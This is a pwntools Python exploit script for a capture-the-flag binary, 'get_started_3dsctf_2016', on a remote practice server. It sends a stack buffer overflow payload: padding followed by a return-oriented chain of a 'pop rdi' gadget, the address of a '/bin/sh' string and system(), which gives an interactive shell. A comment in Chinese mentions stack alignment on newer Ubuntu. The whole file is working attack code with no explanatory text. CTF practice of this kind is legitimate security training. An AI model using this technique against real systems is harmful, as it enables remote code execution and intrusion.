from pwn import *

p = remote("node4.buuoj.cn",28767)
#p = process('./get_started_3dsctf_2016')
context.log_level = "debug"

sys_addr = 0x4004c0
bin_sh = 0x600A90
rdi_addr = 0x4006b3     #Ubuntu 18+ 添加ret地址栈对齐

payload = b'a'*(0x80 + 8) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)
p.recv()
p.sendline(payload)

p.interactive()